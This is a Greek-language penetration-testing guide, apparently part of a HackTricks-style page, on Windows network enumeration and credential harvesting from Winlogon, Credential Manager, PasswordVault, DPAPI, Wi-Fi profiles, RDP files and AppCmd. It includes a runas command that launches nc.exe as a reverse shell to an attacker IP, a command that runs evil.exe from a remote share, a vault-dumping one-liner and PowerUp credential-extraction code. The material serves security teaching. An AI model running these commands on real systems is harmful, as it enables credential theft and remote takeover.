### Κοινόχρηστοι πόροι

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### αρχείο hosts

Ελέγξτε αν υπάρχουν άλλα γνωστά συστήματα με στατικές εγγραφές στο αρχείο hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Διεπαφές δικτύου & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Ανοιχτές θύρες

Ελέγξτε για **περιορισμένες υπηρεσίες** από έξω.

```bash
netstat -ano #Opened ports?
```

Για έναν τοπικό listener, συσχετίστε το PID με τον κάτοχο της διεργασίας, τη διαδρομή του εκτελέσιμου αρχείου και κάθε υπηρεσία ή προγραμματισμένη εργασία που τον εκκινεί. Μια υπηρεσία απομακρυσμένου ελέγχου μπορεί να παρέχει πρόσβαση ως ο χρήστης της επιφάνειας εργασίας της μόνο εφόσον το επιτρέπουν οι έλεγχοι ταυτοποίησης και εντολών της. Μια προσαρμοσμένη εφαρμογή TCP που εκτελείται με λογαριασμό υψηλότερων προνομίων αποτελεί ξεχωριστό στόχο ελέγχου: ο listener και η διαδρομή του binary είναι παθητικές ενδείξεις, ενώ μια αυθεντικοποιημένη διαδρομή εκμετάλλευσης αλλοίωσης μνήμης απαιτεί ανάλυση του συγκεκριμένου binary και των εισόδων στις οποίες έχει πρόσβαση. Αν μια εκτεθειμένη θύρα φαίνεται να ανήκει σε διεργασία συστήματος, συγκρίνετέ την με την εντολή [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) πριν αποδώσετε την υπηρεσία backend· ένας κανόνας προώθησης από μόνος του δεν αποδεικνύει ότι ο προορισμός είναι προσβάσιμος ή ευάλωτος.

### Πίνακας δρομολόγησης

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Πίνακας ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Κανόνες Firewall

[**Δείτε αυτήν τη σελίδα για εντολές σχετικές με το Firewall**](../basic-cmd-for-pentesters.md#firewall) **(λίστα κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερες[ εντολές για network enumeration εδώ](../basic-cmd-for-pentesters.md#network)

### Υποσύστημα Windows για Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Το binary `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσετε δικαιώματα χρήστη root, μπορείτε να ακούτε σε οποιαδήποτε θύρα (την πρώτη φορά που θα χρησιμοποιήσετε το `nc.exe` για να ακούσετε σε μια θύρα, θα εμφανιστεί ένα GUI που θα σας ρωτά αν πρέπει να επιτραπεί στο `nc` η πρόσβαση μέσω του firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Για να ξεκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε το `--default-user root`

Μπορείτε να εξερευνήσετε το σύστημα αρχείων του `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Το Linux `root` μέσα στο WSL δεν παρέχει από μόνο του δικαιώματα Windows Administrator. Αν η τρέχουσα ταυτότητα Windows μπορεί να διαβάσει το σύστημα αρχείων μιας διανομής, ελέγξτε τα αρχεία ιστορικού κελύφους (συμπεριλαμβανομένου του `/root/.bash_history`) για εντολές που ενδέχεται να έχουν καταγράψει διαπιστευτήρια· η κλιμάκωση εξακολουθεί να απαιτεί έναν έγκυρο λογαριασμό με υψηλότερα προνόμια και μια επιτρεπόμενη μέθοδο ελέγχου ταυτότητας. Η διάταξη `LocalState\rootfs` ισχύει για παλαιότερες εγκαταστάσεις WSL· το WSL 2 συνήθως αποθηκεύει τη διανομή σε έναν εικονικό δίσκο [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), επομένως πρώτα εντοπίστε την πραγματική διανομή και τη διαδρομή αποθήκευσής της. Αποφύγετε την εμφάνιση των περιεχομένων του ιστορικού κατά την αυτοματοποιημένη απαρίθμηση.

## Διαπιστευτήρια Windows

### Διαπιστευτήρια Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Θεωρήστε τα `DefaultUserName` και `DefaultDomainName` ως στοιχεία του λογαριασμού και όχι ως διαπιστευτήρια. Μια μη κενή τιμή `DefaultPassword` ή `AltDefaultPassword` αποτελεί εύρημα απλού κειμένου στο registry. Αν το `AutoAdminLogon=1`, αλλά δεν είναι αναγνώσιμος κανένας κωδικός πρόσβασης σε απλό κείμενο, αυτό αποτελεί μόνο ένδειξη: το [Sysinternals Autologon μπορεί να αποθηκεύει τον κωδικό πρόσβασης ως μυστικό LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), ενώ οι συνήθεις αναγνώσεις του registry δεν αποδεικνύουν αν υπάρχει αυτό το μυστικό ή αν μπορεί να ανακτηθεί. Ελέγξτε τα δικαιώματα πρόσβασης και την πραγματική ρύθμιση σύνδεσης πριν αναφέρετε έκθεση διαπιστευτηρίων.

### Credential Manager / Windows Vault

Από το [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Το Windows Vault αποθηκεύει διαπιστευτήρια χρηστών για διακομιστές, ιστότοπους και άλλα προγράμματα, τα οποία μπορούν να χρησιμοποιηθούν από τα **Windows** για να **συνδέουν αυτόματα τους χρήστες**. Αρχικά, μπορεί να φαίνεται ότι οι χρήστες μπορούν να αποθηκεύουν διαπιστευτήρια για ιστότοπους όπως το Facebook, το Twitter ή το Gmail και να συνδέονται αυτόματα μέσω των προγραμμάτων περιήγησης, αλλά δεν λειτουργεί έτσι.

Το Windows Vault αποθηκεύει διαπιστευτήρια με τα οποία τα Windows μπορούν να συνδέουν αυτόματα τους χρήστες. Αυτό σημαίνει ότι κάθε **εφαρμογή Windows που χρειάζεται διαπιστευτήρια για πρόσβαση σε έναν πόρο** (διακομιστή ή ιστότοπο) **μπορεί να χρησιμοποιήσει αυτό το Credential Manager** και το Windows Vault, αξιοποιώντας τα παρεχόμενα διαπιστευτήρια αντί να πληκτρολογούν οι χρήστες κάθε φορά το όνομα χρήστη και τον κωδικό πρόσβασής τους.

Αν οι εφαρμογές δεν αλληλεπιδρούν με το Credential Manager, δεν νομίζω ότι μπορούν να χρησιμοποιήσουν τα διαπιστευτήρια για έναν συγκεκριμένο πόρο. Επομένως, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το vault, θα πρέπει με κάποιον τρόπο να **επικοινωνήσει με το Credential Manager και να ζητήσει τα διαπιστευτήρια για αυτόν τον πόρο** από το προεπιλεγμένο vault αποθήκευσης.

Χρησιμοποιήστε το `cmdkey` για να εμφανίσετε τα αποθηκευμένα διαπιστευτήρια στον υπολογιστή.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το `runas` με την επιλογή `/savecred` για να χρησιμοποιήσετε τα αποθηκευμένα διαπιστευτήρια. Το παρακάτω παράδειγμα εκτελεί ένα απομακρυσμένο binary μέσω ενός SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Χρήση του `runas` με παρεχόμενα διαπιστευτήρια.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Σημειώστε ότι μπορείτε να χρησιμοποιήσετε τα mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ή το [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Οι σύγχρονες εφαρμογές Windows UWP, το Microsoft Edge και οι σύγχρονες υπηρεσίες συστήματος αποθηκεύουν authentication tokens και plaintext passwords μέσα στο `PasswordVault` του Universal Windows Platform (UWP) (εμφανίζεται επίσης ως `Web Credentials` στο `vaultcmd`). Αυτός ο χώρος αποθήκευσης είναι απομονωμένος ανά session και μπορεί να γίνει decrypt εγγενώς, χωρίς δικαιώματα διαχειριστή ή `SeDebugPrivilege`.

Εκτελέστε αυτήν την εντολή PowerShell μέσα στο ενεργό session του χρήστη, για να κάνετε αμέσως dump και decrypt όλα τα αποθηκευμένα usernames και plaintext passwords:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Το **Data Protection API (DPAPI)** παρέχει μια μέθοδο συμμετρικής κρυπτογράφησης δεδομένων, η οποία χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος, το οποίο συμβάλλει σημαντικά στην εντροπία.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που παράγεται από τα μυστικά σύνδεσης του χρήστη**. Σε περιπτώσεις κρυπτογράφησης συστήματος, χρησιμοποιεί τα μυστικά ελέγχου ταυτότητας του τομέα του συστήματος.

Τα κρυπτογραφημένα κλειδιά RSA χρηστών, με χρήση DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το `{SID}` αντιπροσωπεύει το [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) του χρήστη. **Το κλειδί DPAPI, το οποίο βρίσκεται στο ίδιο αρχείο με το κύριο κλειδί που προστατεύει τα ιδιωτικά κλειδιά του χρήστη**, αποτελείται συνήθως από 64 byte τυχαίων δεδομένων. (Είναι σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, οπότε δεν είναι δυνατή η προβολή των περιεχομένων του με την εντολή `dir` στο CMD, παρότι μπορούν να προβληθούν μέσω του PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Μπορείτε να χρησιμοποιήσετε το **module mimikatz** `dpapi::masterkey` με τα κατάλληλα ορίσματα (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **αρχεία διαπιστευτηρίων που προστατεύονται από τον κύριο κωδικό πρόσβασης** βρίσκονται συνήθως στα εξής:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για αποκρυπτογράφηση.\
Μπορείτε να **εξαγάγετε πολλά DPAPI** **masterkeys** από τη **μνήμη** με το module `sekurlsa::dpapi` (αν είστε root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Διαπιστευτήρια PowerShell

Τα **διαπιστευτήρια PowerShell** χρησιμοποιούνται συχνά σε εργασίες **scripting** και αυτοματοποίησης, ως ένας εύχρηστος τρόπος αποθήκευσης κρυπτογραφημένων διαπιστευτηρίων. Τα διαπιστευτήρια προστατεύονται με **DPAPI**, πράγμα που συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Ένα εξαγόμενο διαπιστευτήριο μπορεί να έχει αυθαίρετο όνομα αρχείου ή διαδρομή `.xml`. Όταν ένα script ή μια απογραφή αρχείων υποδεικνύει ένα τέτοιο αρχείο, εντοπίστε τον πραγματικό κατάλογο προφίλ του λογαριασμού αντί να υποθέσετε ότι βρίσκεται στο `C:\Users`: [Τα Windows μπορούν να τοποθετούν τα προφίλ και αλλού](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Ένα αρχείο που μπορείτε να διαβάσετε αποτελεί μόνο ένα στοιχείο προς διερεύνηση· η [εντολή `Export-Clixml` των Windows συνδέει ένα κρυπτογραφημένο διαπιστευτήριο με τον χρήστη και τον υπολογιστή που το εξήγαγαν](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), ενώ κάθε λογαριασμός που ανακτάται πρέπει ξεχωριστά να διαθέτει τα κατάλληλα δικαιώματα στην υπηρεσία-στόχο. Ελέγξτε πρώτα τις διαδρομές και τις ACL, χωρίς να εμφανίζετε κρυπτογραφημένες ή απλές τιμές κατά τη συνήθη απογραφή.

Για να **αποκρυπτογραφήσετε** διαπιστευτήρια PS από το αρχείο που τα περιέχει, μπορείτε να κάνετε τα εξής:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Αποθηκευμένες συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Εντολές που εκτελέστηκαν πρόσφατα

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Διαχείριση διαπιστευτηρίων Απομακρυσμένης επιφάνειας εργασίας**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Χρησιμοποιήστε το module `dpapi::rdg` του **Mimikatz** με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε οποιαδήποτε αρχεία .rdg**\
Μπορείτε να **εξαγάγετε πολλά DPAPI masterkeys** από τη μνήμη με το module `sekurlsa::dpapi` του Mimikatz

**Το mRemoteNG χρησιμοποιεί διαφορετικό χώρο αποθήκευσης συνδέσεων.** Εξετάστε τα αναγνώσιμα XML στον φάκελο `%APPDATA%\mRemoteNG` και στα Έγγραφα του χρήστη, συμπεριλαμβανομένων αρχείων με συνηθισμένα ονόματα, όπως `config.xml`. Εντοπίστε το σχήμα των συνδέσεων και τα κρυπτογραφημένα χαρακτηριστικά `Password` προτού θεωρήσετε ένα αρχείο XML πιθανή πηγή διαπιστευτηρίων. Η αποθηκευμένη τιμή δεν είναι κωδικός DPAPI/RDCMan· η ανάκτησή της εξαρτάται από τις ρυθμίσεις κρυπτογράφησης του αρχείου και από το αν χρησιμοποιήθηκε προσαρμοσμένος κύριος κωδικός πρόσβασης. Αποφύγετε την εκτύπωση κρυπτογραφημένων τιμών κατά τη γενική απαρίθμηση.

**Οι εξαγωγές προφίλ του Remote Desktop Plus** μπορεί επίσης να είναι αναγνώσιμες στους καταλόγους χρηστών ή σε κοινόχρηστο φάκελο διαχείρισης. Μια εξαγωγή παλαιού τύπου `profiles.xml` έχει καταχωρίσεις `Data/Profile` με στοιχεία `ProfileName`, `Password` και `Secure`. Αντιμετωπίστε ένα μη κενό στοιχείο κωδικού πρόσβασης ως πιθανή πηγή διαπιστευτηρίων, χωρίς να το εκτυπώνετε ή να υποθέτετε ότι είναι απλό κείμενο: [ο προμηθευτής σημειώνει](https://www.donkz.nl/) ότι η προστασία των προφίλ μπορεί να συνδέεται με τον λογαριασμό και τον υπολογιστή δημιουργίας ή να έχει ρυθμιστεί με λιγότερο αυστηρό τρόπο. Επιβεβαιώστε την προέλευση του αρχείου και τις προϋποθέσεις ανάκτησης προτού βασιστείτε σε αυτό.

### Sticky Notes

Οι χρήστες μερικές φορές αποθηκεύουν κωδικούς πρόσβασης και άλλες πληροφορίες σε εφαρμογές σημειώσεων. Η συσκευασμένη εφαρμογή Sticky Notes της Microsoft αποθηκεύει συνήθως τις σημειώσεις στη διαδρομή `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`· παλαιότερες ή διαφορετικές εφαρμογές ενδέχεται να χρησιμοποιούν άλλους χώρους αποθήκευσης στο προφίλ χρήστη, όπως το LevelDB. Εντοπίστε την εγκατεστημένη εφαρμογή και τη μορφή αποθήκευσης πριν θεωρήσετε ότι η απουσία αρχείου SQLite σημαίνει πως δεν υπάρχουν σημειώσεις.

Αν το Sticky Notes χρησιμοποιεί SQLite write-ahead logging, ένα αντίγραφο μόνο του `plum.sqlite` ενδέχεται να μην περιλαμβάνει πρόσφατες, οριστικοποιημένες σημειώσεις. Διατηρήστε το αντίστοιχο `plum.sqlite-wal` μαζί με ένα συνεπές αντίγραφο της βάσης δεδομένων και συμπεριλάβετε το `plum.sqlite-shm`, αν είναι διαθέσιμο· ο δείκτης κοινόχρηστης μνήμης μπορεί να αναδημιουργηθεί, αλλά το WAL αποτελεί μέρος της μόνιμης κατάστασης της βάσης δεδομένων. Δείτε την [τεκμηρίωση WAL του SQLite](https://www.sqlite.org/wal.html). Μια σημείωση που περιέχει όνομα λογαριασμού ή κωδικό πρόσβασης αποτελεί μόνο πιθανή πηγή διαπιστευτηρίων: επαληθεύστε ξεχωριστά τον λογαριασμό, την επιτρεπόμενη πρόσβαση και την επαναχρησιμοποίηση κωδικών πρόσβασης. Μια κρυπτογραφημένη εγγραφή διαχειριστή κωδικών απαιτεί επιπλέον το πραγματικό κλειδί αποκρυπτογράφησής της και ερμηνεία ειδική για την εφαρμογή, προτού μπορέσει να τεκμηριώσει σύνδεση με υψηλότερα προνόμια.

### AppCmd.exe

**Σημειώστε ότι για να ανακτήσετε κωδικούς πρόσβασης από το AppCmd.exe, πρέπει να είστε Administrator και να εκτελείτε το πρόγραμμα σε επίπεδο High Integrity.**\
Το **AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\
Αν αυτό το αρχείο υπάρχει, τότε είναι πιθανό να έχουν ρυθμιστεί ορισμένα **διαπιστευτήρια** και να μπορούν να **ανακτηθούν**.

Αυτός ο κώδικας εξήχθη από το [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe`.\
Οι installers **εκτελούνται με δικαιώματα SYSTEM**, πολλοί είναι ευάλωτοι σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Αρχεία και Registry (Διαπιστευτήρια)

### Artifacts διαπιστευτηρίων στο registry εργαλείων υποστήριξης

Ορισμένες παλαιότερες εγκαταστάσεις απομακρυσμένης υποστήριξης διατηρούν ονόματα τιμών σχετικών με κωδικούς πρόσβασης σε σταθερά κλειδιά registry της εφαρμογής. Για παράδειγμα, το `SecurityPasswordAES` του TeamViewer προσδιόριζε έναν στατικό κωδικό πρόσβασης συνεδρίας που είχε ρυθμιστεί σε εκδόσεις πριν από την 9, σύμφωνα με την [εξήγηση του προμηθευτή για το κλειδί registry](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Ένας δείκτης ονόματος τιμής αποτελεί μόνο αφορμή για έλεγχο: επαληθεύστε την εγκατεστημένη έκδοση, αν τα δεδομένα της τιμής είναι αναγνώσιμα, τη μορφή τους και την τρέχουσα συμπεριφορά ελέγχου ταυτότητας πριν αξιολογήσετε το συγκεκριμένο διαπιστευτήριο. Η μετάβαση από έναν κωδικό απομακρυσμένης υποστήριξης σε έναν λογαριασμό Windows με περισσότερα προνόμια προϋποθέτει επίσης πραγματική επαναχρησιμοποίηση του κωδικού και εξουσιοδότηση για αυτόν τον λογαριασμό. Μην συμπεριλαμβάνετε ciphertext και ανακτημένους κωδικούς πρόσβασης στη συνήθη έξοδο απαρίθμησης.

### Κοινόχρηστα υπολογιστικά φύλλα με προστατευμένα φύλλα

Αν υπάρχει υποψία ότι ένα αναγνώσιμο κοινόχρηστο βιβλίο εργασίας περιέχει δεδομένα λογαριασμών, διακρίνετε την **κρυπτογράφηση αρχείου** από την προστασία φύλλου εργασίας ή τις κρυφές στήλες. Η [Microsoft αναφέρει](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) ότι η προστασία φύλλου εργασίας ελέγχει την επεξεργασία και δεν αποτελεί χαρακτηριστικό ασφαλείας· από μόνη της δεν αποδεικνύει ότι τα περιεχόμενα του βιβλίου εργασίας είναι κρυπτογραφημένα. Ελέγχετε μόνο σχετικά αρχεία για τα οποία υπάρχει εξουσιοδότηση και αποφύγετε την εμφάνιση πιθανών μυστικών κατά την ευρεία απαρίθμηση. Μια αναγνώσιμη διαδρομή `.xlsx`, ένα προστατευμένο φύλλο ή μια κρυφή στήλη από μόνα τους δεν αποδεικνύουν ότι υπάρχουν διαπιστευτήρια ή ότι κάποιος λογαριασμός έχει περισσότερα προνόμια· επαληθεύστε ξεχωριστά τα πραγματικά δεδομένα και τα τρέχοντα δικαιώματα λογαριασμού.

### Διατηρημένα patches αλλαγών σε CI server

Ένας CI server ενδέχεται να διατηρεί υποβληθείσες αλλαγές πηγαίου κώδικα στον κατάλογο δεδομένων του, ακόμη και μετά την ολοκλήρωση του build. Η [TeamCity τεκμηριώνει](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) το `system/changes` ως χώρο αποθήκευσης αλλαγών remote-run· ο κατάλογος δεδομένων μπορεί να ρυθμιστεί και δεν βρίσκεται απαραίτητα κάτω από το `ProgramData`. Ένα αναγνώσιμο patch μπορεί να διατηρεί αναφορές, που έχουν αφαιρεθεί ή προστεθεί, σε αρχείο διαπιστευτηρίων, κλειδί κρυπτογράφησης ή script που χρησιμοποιεί και τα δύο. Για παράδειγμα, μια ροή εργασίας PowerShell `ConvertTo-SecureString -Key` απαιτεί τόσο το κλειδί AES όσο και την κρυπτογραφημένη συμβολοσειρά· η [Microsoft τεκμηριώνει](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) ότι το κλειδί παρέχεται ξεχωριστά. Ελέγξτε πρώτα μόνο τα προσβάσιμα ονόματα patch και στη συνέχεια, εφόσον υπάρχει εξουσιοδότηση, εξετάστε το σχετικό περιεχόμενο χωρίς να εμφανίζετε μυστικά στη συνήθη έξοδο απαρίθμησης. Μια διαδρομή patch, μια κρυπτογραφημένη τιμή ή μια αναφορά σε κλειδί από μόνα τους δεν αποδεικνύουν έγκυρο διαπιστευτήριο ή πρόσβαση με περισσότερα προνόμια. Περιορίστε τα ACL του καταλόγου δεδομένων και αποφύγετε την ενσωμάτωση μυστικών σε αλλαγές build.

### Προσαρμοσμένη περιστροφή κωδικού πρόσβασης τοπικού administrator

Ένας αυτοσχέδιος μηχανισμός περιστροφής κωδικών πρόσβασης μπορεί να αποθηκεύει κρυπτογραφημένο κωδικό πρόσβασης τοπικού administrator σε τοπική υπηρεσία, ενώ διατηρεί τα διαπιστευτήρια του datastore σε αναγνώσιμο αρχείο `.env` ή δίπλα στο εκτελέσιμο αρχείο updater. Εξετάστε μαζί την προγραμματισμένη εργασία του updater, τον λογαριασμό, τα ACL διαμόρφωσης, τον listener και τα δικαιώματα του datastore. Ένα datastore που ακούει μόνο στο loopback παραμένει προσβάσιμο σε τοπικό χρήστη με έγκυρα διαπιστευτήρια, αλλά ο έλεγχος ταυτότητας από μόνος του δεν αποδεικνύει δικαίωμα ανάγνωσης των σχετικών εγγραφών. Αν το seed κρυπτογράφησης ή το υλικό κλειδιού είναι προσβάσιμο δίπλα στο ciphertext, ελέγξτε ακριβώς την παραγωγή κλειδιού πριν εμπιστευτείτε την κρυπτογράφηση. Ένα σχήμα που παράγει ντετερμινιστικά κλειδί AES από εκτεθειμένο seed χρησιμοποιώντας το Go [`math/rand`](https://pkg.go.dev/math/rand) δεν είναι κατάλληλο για την προστασία αυτού του κωδικού πρόσβασης· η τεκμηρίωση του Go αναφέρει ότι αυτό το package δεν είναι κατάλληλο για τυχαιότητα ευαίσθητη σε θέματα ασφάλειας. Επιβεβαιώστε ότι οποιοσδήποτε ανακτημένος κωδικός πρόσβασης είναι τρέχων και ανήκει σε λογαριασμό της ομάδας τοπικών Administrators πριν τον θεωρήσετε πιθανή οδό κλιμάκωσης. Μια προγραμματισμένη εργασία, μια διαδρομή `.env` ή ένα κρυπτογραφημένο blob από μόνα τους δεν αποδεικνύουν καμία από αυτές τις συνθήκες. Μην συμπεριλαμβάνετε κωδικούς πρόσβασης και υλικό κλειδιών στη συνήθη έξοδο απαρίθμησης.

